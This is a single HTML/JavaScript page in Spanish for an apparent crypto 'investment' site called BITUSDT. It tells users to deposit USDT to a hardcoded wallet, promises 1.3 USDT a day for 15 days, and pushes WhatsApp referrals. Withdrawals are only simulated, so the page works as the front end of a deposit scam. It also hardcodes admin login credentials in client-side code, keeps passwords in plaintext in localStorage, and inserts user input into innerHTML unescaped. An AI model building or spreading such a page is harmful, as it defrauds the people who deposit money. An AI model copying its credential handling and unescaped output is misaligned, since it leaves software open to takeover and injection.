<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>BITUSDT</title>

<style>
body{margin:0;font-family:Arial;background:#0f172a;color:white}
.card{background:#111827;margin:15px;padding:15px;border-radius:12px}
input,button{width:100%;padding:10px;margin:6px;border-radius:8px;border:none}
button{background:#22c55e;color:black;font-weight:bold}
button:hover{opacity:.8}
.hide{display:none}
.admin{background:#1f2933}
</style>
</head>

<body>

<!-- LOGIN -->
<div class="card" id="loginBox">
<h3>LOGIN</h3>
<input id="l_email" placeholder="Correo">
<input id="l_pass" type="password" placeholder="Contraseña">
<button onclick="login()">Entrar</button>
<p id="msg"></p>
<p><small onclick="mostrarRecuperar()">¿Olvidó su contraseña?</small></p>
</div>

<!-- REGISTRO -->
<div class="card hide" id="registerBox">
<h3>REGISTRO</h3>
<input id="r_email" placeholder="Correo">
<input id="r_pass" type="password" placeholder="Contraseña">
<button onclick="registrar()">Registrar</button>
<button onclick="volverLogin()">Volver</button>
</div>

<!-- PANEL USUARIO -->
<div class="card hide" id="panel">
<h3>Panel Usuario</h3>

<p>Tu billetera para depositar:</p>
<p><b id="wallet"></b></p>
<button onclick="copiarWallet()">Copiar billetera</button>

<hr>

<p>Saldo: <b id="saldo">0</b> USDT</p>
<p>Día: <b id="dia">0</b>/15</p>
<p>Ganancia diaria: 1.3 USDT</p>

<input id="monto" placeholder="Monto a invertir">
<button onclick="invertir()">Invertir</button>

<button onclick="retirar()">Retirar</button>

<button onclick="referir()">Compartir WhatsApp</button>

<button onclick="logout()">Salir</button>
</div>

<!-- ADMIN -->
<div class="card admin hide" id="admin">
<h3>ADMIN</h3>
<div id="sol"></div>
<button onclick="logout()">Salir</button>
</div>

<script>
// DATOS
let walletAdmin="TXDiTXnPUV3th3rHtZaX4XqzdJeVLbJeVo";
wallet.innerHTML=walletAdmin;

let users=JSON.parse(localStorage.getItem("users"))||[];
let solicitudes=JSON.parse(localStorage.getItem("sol"))||[];
let actual=null;

// LOGIN
function login(){

let e=l_email.value;
let p=l_pass.value;

// ADMIN
if(e=="Binancecoin958@gmail.com" && p=="Enriique1998"){
admin.classList.remove("hide");
loginBox.classList.add("hide");
cargarAdmin();
return;
}

// USUARIO
actual=users.find(u=>u.e==e && u.p==p);

if(!actual){
msg.innerHTML="Datos incorrectos";
return;
}

loginBox.classList.add("hide");
panel.classList.remove("hide");
cargar();
}

// REGISTRO
function registrar(){

let e=r_email.value;
let p=r_pass.value;

if(users.find(x=>x.e==e)){
alert("Ya existe");
return;
}

users.push({
e:e,
p:p,
s:0,
d:0,
aprobado:false
});

guardar();
alert("Registrado correctamente");
volverLogin();
}

// MOSTRAR REGISTRO
function mostrarRecuperar(){
loginBox.classList.add("hide");
registerBox.classList.remove("hide");
}

// VOLVER LOGIN
function volverLogin(){
registerBox.classList.add("hide");
loginBox.classList.remove("hide");
}

// INVERTIR
function invertir(){

if(!actual.aprobado){
solicitudes.push({
email:actual.e,
monto:monto.value
});
guardar();
alert("Solicitud enviada al admin");
}else{
alert("Ya tienes inversión activa");
}
}

// CARGAR PANEL
function cargar(){
saldo.innerHTML=actual.s;
dia.innerHTML=actual.d;
}

// RETIRO
function retirar(){

if(actual.s<20){
alert("Mínimo 20 USDT");
return;
}

// DESCUENTO 4 USD
let recibe=actual.s-4;
alert("Recibes "+recibe+" USDT (simulado)");

actual.s=0;
actual.d=0;
actual.aprobado=false;
guardar();
cargar();
}

// SALIR
function logout(){
location.reload();
}

// REFERIDOS
function referir(){
let link=location.href;
window.open("https://wa.me/?text=Regístrate aquí "+link);
}

// COPIAR WALLET
function copiarWallet(){
navigator.clipboard.writeText(walletAdmin);
alert("Billetera copiada");
}

// GUARDAR
function guardar(){
localStorage.setItem("users",JSON.stringify(users));
localStorage.setItem("sol",JSON.stringify(solicitudes));
}

// GANANCIAS DIARIAS
setInterval(()=>{
if(actual && actual.aprobado && actual.d<15){
actual.d++;
actual.s+=1.3;
guardar();
cargar();
}
},86400000);

// ADMIN
function cargarAdmin(){

sol.innerHTML="";

if(solicitudes.length==0){
sol.innerHTML="<p>No hay solicitudes</p>";
return;
}

solicitudes.forEach((x,i)=>{

sol.innerHTML+=`
<div style="background:#0f172a;padding:10px;margin:6px;border-radius:8px">
<b>${x.email}</b><br>
Monto: ${x.monto} USDT<br><br>

<button onclick="aprobar(${i})">Aprobar</button>
<button onclick="rechazar(${i})"
style="background:#ef4444;color:white">Rechazar</button>
</div>
`;
});
}

// APROBAR
function aprobar(i){

let u=users.find(x=>x.e==solicitudes[i].email);

u.aprobado=true;
u.s=0;
u.d=0;

solicitudes.splice(i,1);
guardar();
cargarAdmin();
}

// RECHAZAR
function rechazar(i){
solicitudes.splice(i,1);
guardar();
cargarAdmin();
}

setInterval(cargarAdmin,3000);

</script>
</body>
</html>

